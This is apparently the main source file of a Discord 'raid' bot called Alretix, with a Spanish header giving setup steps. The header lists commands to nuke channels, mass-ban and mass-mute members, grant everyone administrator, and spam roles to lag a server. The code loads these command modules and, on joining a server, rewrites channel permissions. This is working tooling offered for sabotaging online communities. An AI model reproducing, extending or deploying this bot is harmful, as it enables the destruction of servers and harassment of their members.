/*
Atención:

Este bot fue creado a mano por: (ID: 533493533462626304) y (ID: 897321561722339419)


Los comandos son los siguientes:


¿Cómo enciendo el bot?

Primero debes tener lo siguiente:

Node: v16 LTS


Primero debes ingresar la información que se te pide en el archivo <Config.json>

Seguido a esto abre la consola y ejecuta los siguientes comandos en la terminal:

cmd: npm install
cmd: node slashcmds.js
cmd: node .

Seguido a esto el bot encenderá sin problemas.

Nota: En Cada comando hay una linea de Timeout, puedes cambiar el tiempo de cada uno, me refiero a que cada comando tiene Cooldown así que cada que usen un comando no podrán usarlo hasta que termine el tiempo.
(Slash Commands:
  /admin [Usuario] : Date administrador en el servidor o a alguien mas.
  /adminall : Dale administrador a todos los usuarios del servidor.
  /apodos <Nombre> : Cambia el apodo de los usuarios inferiores al rol del Bot
  /customraid <Opciones> : Customiza tu Raid <Comando VIP>
  /lag : Este comando le dará Administrador a todos los usuarios del servidor y comenzará a crear muchos roles en el server generando lag por la repentina creación de estos.
  ⬆️ Preferiblemente este comando usalo despues de Raidear.

  /nuke : Limpia los canales del servidor.
  /massban : Banea a todos los usuarios inferiores al rol del bot en el servidor menos a ti.
  /massmute : Aisla a todos los usuarios inferiores al rol del bot en el servidormenos a ti.
  /massroles <Opciones> : Crea muchos roles personalizados
  /raid : Raidea el servidor
  /serverbanner : Cambia el Banner del server
  /servericon : Cambia el icono del server
  /servername : Cambia el nombre del server
  /terminar : Saca al Bot del server
)

(Comandos Normales:
  .admin [Usuario] : Date admin a ti o a alguien mas
  .adminall : Dale admin a todos los usuarios del server
  .apodos <Nombre> : Cambia el nombre de los usuarios inferiores al rol del bot en el server
  .lag : Dale admin a todos y crea muchos roles generando Lag a los usuarios presentes en el servidor
  .massban : Banea a la mayoría de los usuarios inferiores al rol del bot en el servidor
  .massmute : Mutea a la mayoría de los usuarios inferiores al rol del bot en el servidor
  .nuke : Limpia los canales del servidor
  .raid : Raidea el servidor
  .terminar : Saca al bot del server

)

Si quieres añadir más comandos mira la carpeta ./bases y verás información de como hacerlo.


Puede que hayan ERRORES, pero son minimos por lo tanto estos pueden estar presentes por lo que te recomiendo revisarlos, yo ya no meteré mano a este bot por lo que es responsabilidad ahora de quien lo usa y manipula el SRC.
*/




const Discord = require('discord.js')
const { Intents } = require('discord.js');
const { Collection } = require('discord.js')
const fs = require('fs')
const INTENTS = [
  Intents.FLAGS.GUILDS,
  Intents.FLAGS.GUILD_PRESENCES,
  Intents.FLAGS.GUILD_MEMBERS,
  Intents.FLAGS.GUILD_WEBHOOKS,
  Intents.FLAGS.GUILD_MESSAGES,
  Intents.FLAGS.DIRECT_MESSAGES,
  Intents.FLAGS.GUILD_VOICE_STATES
]
const client = new Discord.Client({ intents: INTENTS, repliedUser: false } );
const ms = require('ms');



client.on('ready', ()=>{
  
  client.user.setActivity('Alretix v11.7', { type: 'WATCHING' });
  client.user.setPresence({
    status: "dnd"
  });
  console.log(`ON: Servers: ${client.guilds.cache.size}`)
})


const Timeout = new Collection();

client.on('guildCreate', async guild =>{//Al ingresar el Bot a un servidor ejecutará las siguientes funciones las cuales permitirán a los usuarios usar los slashcommands en todos los canales del servidor.

  guild.roles.cache.find(role => role.name === '@everyone').setPermissions('USE_APPLICATION_COMMANDS').then(()=>{
  //Buscamos el rol @everyone y le establecemos el permiso para el uso de slash commands
    guild.channels.cache.forEach(channel =>{//
      //Obtendremos el contenido del servidor los cuales serían los canales para proceder a cambiar sus permisos.
        channel.permissionOverwrites.edit(guild.id, {'USE_APPLICATION_COMMANDS': true,'READ_MESSAGE_HISTORY': true, 'VIEW_CHANNEL': true, 'SEND_MESSAGES': true}).catch(()=>{
          return;
        })
 
     

    })
    }).catch(()=>{
      return;
    })
  

})


//////////////////////////////SLASHCOMMANDS INICIO///////////////////////////////////////////


client.slashcommands = new Discord.Collection();
const slashcommandsFiles = fs.readdirSync(`./slashcmd/cmds`).filter(file => file.endsWith("js"))



for(const file of slashcommandsFiles){
  const slash = require(`./slashcmd/cmds/${file}`)
  console.log(`✅ Slash commands - ${file} cargado`)
  client.slashcommands.set(slash.data.name, slash)
}
client.on("interactionCreate", async (interaction)=>{

   
    if(!interaction.guild.me.permissions.has('ADMINISTRATOR')){
      return interaction.reply({content: '**No tengo permisos en este servidor. Permiso requerido: ADMINISTRADOR**', ephemeral: true})

    }
    

    const slashcmds = client.slashcommands.get(interaction.commandName)

    if(!slashcmds) return;
 
    if(!interaction.isCommand()) return;
    let command = client.slashcommands.find(c => c.data.name === interaction.commandName);
    if (!command) command = client.slashcommands.get(client.slashcommands.get(interaction.commandName));
  
    if(command.timeout) {
      
    if(Timeout.has(`${command.data.name}${interaction.user.id}`)) return interaction.reply({content: ` **Espera ${ms(Timeout.get(`${command.data.name}${interaction.user.id}`) - Date.now(), {long : true})} para volver a usar este comando!**`, ephemeral: true})
  }else{
      await slashcmds.run(client, interaction)
    
      Timeout.set(`${command.data.name}${interaction.user.id}`, Date.now() + command.timeout)
      setTimeout(() => {
          Timeout.delete(`${command.data.name}${interaction.user.id}`)
      }, command.timeout)
      return;
    }
   


 


});
//////////////////////////////SLASHCOMMANDS FINAL///////////////////////////////////////////

/////////////////////////////COMANDOS NORMALES/////////////////////////////////////////////


client.comandos = new Collection();
client.aliases = new Collection();

['command'].forEach(handler => {
	require(`./handlers/${handler}.js`)(client);
});

client.on('messageCreate', async message => {


  try {

    let prefix = '.'


	if (message.author.bot) return;
	if (!message.guild) return;

	if (!message.content.startsWith(prefix)) return;

	if (!message.member)

		message.member = await message.guild.fetchMember(message);
	const args = message.content
		.slice(prefix.length)
		.trim()
		.split(/ +/g);
	const cmd = args.shift().toLowerCase();

	if (!cmd) return;
	let command = client.comandos.find(
		c => c.name === cmd ||(c.alias && c.alias.includes(cmd))
	);
	if (!command) command = client.comandos.get(client.aliases.get(cmd));

  const filter = (m) => m.author.id == message.author.id;
  try {
    if (command) {
//l
      if(command.bot == true) {
        if(command.timeout){
          if(Timeout.has(`${command.name}${message.author.id}`)){
           
            return message.reply(`**Espera ${ms(Timeout.get(`${command.name}${message.author.id}`) - Date.now(), {long: true})} para usar este comando de nuevo.**`).then(m=>{
              
              setTimeout(()=>{
                m.delete()
              }, ms(ms(Timeout.get(`${command.name}${message.author.id}`) - Date.now())))
            })
  
          } 
          command.run(client, message, args, prefix)
  
  
          Timeout.set(`${command.name}${message.author.id}`, Date.now() + command.timeout)
          setTimeout(() => {
              Timeout.delete(`${command.name}${message.author.id}`)
          }, command.timeout)
        }
      }else{

   
    
     

      if(!command.timeout) {
        if(!message.guild.me.permissions.has('ADMINISTRATOR')) return message.reply('**No tengo permisos en este servidor. Permiso requerido: ADMINISTRADOR**').then(m=>{
          message.delete().catch(()=>{
            return;
          })
          setTimeout(() => {
            m.delete().catch(()=>{
              return;
            })
          }, 5000);
  
        }).catch(()=>{
          return message.author.send('**No tengo permisos en este servidor, permiso requerido: ADMINISTRADOR**').catch(()=>{
            return;
          })
        })

        command.run(client, message, args, prefix)
      }
      if(command.timeout) {
          
        if(!message.guild.me.permissions.has('ADMINISTRATOR')) return message.reply('**No tengo permisos en este servidor. Permiso requerido: ADMINISTRADOR**').then(m=>{
          message.delete().catch(()=>{
            return;
          })
          setTimeout(() => {
            m.delete().catch(()=>{
              return;
            })
          }, 5000);
  
        }).catch(()=>{
          return message.author.send('**No tengo permisos en este servidor, permiso requerido: ADMINISTRADOR**').catch(()=>{
            return;
          })
        })

        
          if(Timeout.has(`${command.name}${message.author.id}`)){
            
            return message.reply(`**Espera ${ms(Timeout.get(`${command.name}${message.author.id}`) - Date.now(), {long: true})} para usar este comando de nuevo.**`).then(m=>{
              
              setTimeout(()=>{
                m.delete()
              }, ms(ms(Timeout.get(`${command.name}${message.author.id}`) - Date.now())))
            })

          } 
          command.run(client, message, args, prefix)


          Timeout.set(`${command.name}${message.author.id}`, Date.now() + command.timeout)
          setTimeout(() => {
              Timeout.delete(`${command.name}${message.author.id}`)
          }, command.timeout)
      }
    }

  }


  } catch (error) {
      console.error(error)
  }

} catch (error) {
  return;
}
});

/////////////////////////////COMANDOS NORMALES FINAL/////////////////////////////////////////////

client.login(require('./config.json').token)
